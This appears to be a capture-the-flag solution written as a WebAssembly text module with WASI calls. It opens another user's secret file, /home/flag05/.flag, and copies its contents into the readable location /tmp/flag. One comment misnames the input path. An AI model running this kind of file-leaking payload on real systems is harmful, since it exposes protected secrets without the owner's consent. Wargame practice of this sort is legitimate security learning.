(module
  (import "wasi_snapshot_preview1" "path_open"
    (func $path_open
      (param i32 i32 i32 i32 i32 i64 i64 i32 i32)
      (result i32)
    )
  )

  (import "wasi_snapshot_preview1" "fd_read"
    (func $fd_read
      (param i32 i32 i32 i32)
      (result i32)
    )
  )

  (import "wasi_snapshot_preview1" "fd_write"
    (func $fd_write
      (param i32 i32 i32 i32)
      (result i32)
    )
  )

  (memory 1)
  (export "memory" (memory 0))

  (data (i32.const 0)  "home/flag05/.flag")
  (data (i32.const 32) "tmp/flag")


  ;; 0   : input file, /home/flag05/.flag
  ;; 32  : output flag, /tmp/flag
  ;; 64  : buffer[32]
  ;;
  ;; 128 : read iovec
  ;; 136 : write iovec
  ;; 144 : read chars
  ;; 148 : written chars
  ;; 152 : fd of input file
  ;; 156 : fd of output file

  (func $_start
    (local $fd1 i32)
    (local $fd2 i32)
    (local $r i32)


    ;; fd1 = open("/tmp/myfile.txt", O_RDONLY)

    i32.const 3              ;; dirfd = /
    i32.const 0              ;; dirflags
    i32.const 0              ;; path = "home/flag05/.flag"
    i32.const 17             ;; path_len = strlen("home/flag05/.flag")
    i32.const 0              ;; oflags = 0 (O_RDONLY)
    i64.const 2              ;; rights_base = FD_READ
    i64.const 0              ;; rights_inheriting
    i32.const 0              ;; fdflags
    i32.const 152            ;; adress of read fd
    call $path_open

    drop

    ;; Save fd in fd1
    i32.const 152
    i32.load
    local.set $fd1


    ;; iov.buf = 64
    i32.const 128
    i32.const 64
    i32.store

    ;; iov.buf_len = 32
    i32.const 132
    i32.const 32
    i32.store

    ;; fd_read(fd1, &iov, 1, &nread)
    local.get $fd1
    i32.const 128
    i32.const 1
    i32.const 144
    call $fd_read

    drop

    ;; r = nread
    i32.const 144
    i32.load
    local.set $r


    ;; fd2 = open(
    ;;     "/tmp/flag",
    ;;     O_CREAT | O_WRONLY
    ;; )

    i32.const 3              ;; dirfd = /
    i32.const 0              ;; dirflags
    i32.const 32             ;; path = "tmp/flag"
    i32.const 8              ;; path_len = strlen("tmp/flag")
    i32.const 1              ;; OFLAGS_CREAT
    i64.const 64             ;; rights_base = FD_WRITE
    i64.const 0              ;; rights_inheriting
    i32.const 0              ;; fdflags
    i32.const 156            ;; adress of fd write
    call $path_open

    drop

    i32.const 156
    i32.load
    local.set $fd2


    ;; iov.buf = 64
    i32.const 136
    i32.const 64
    i32.store

    ;; iov.buf_len = r
    i32.const 140
    local.get $r
    i32.store

    ;; fd_write(fd2, &iov, 1, &nwritten)
    local.get $fd2
    i32.const 136
    i32.const 1
    i32.const 148
    call $fd_write

    drop
  )


  (export "_start" (func $_start))
)
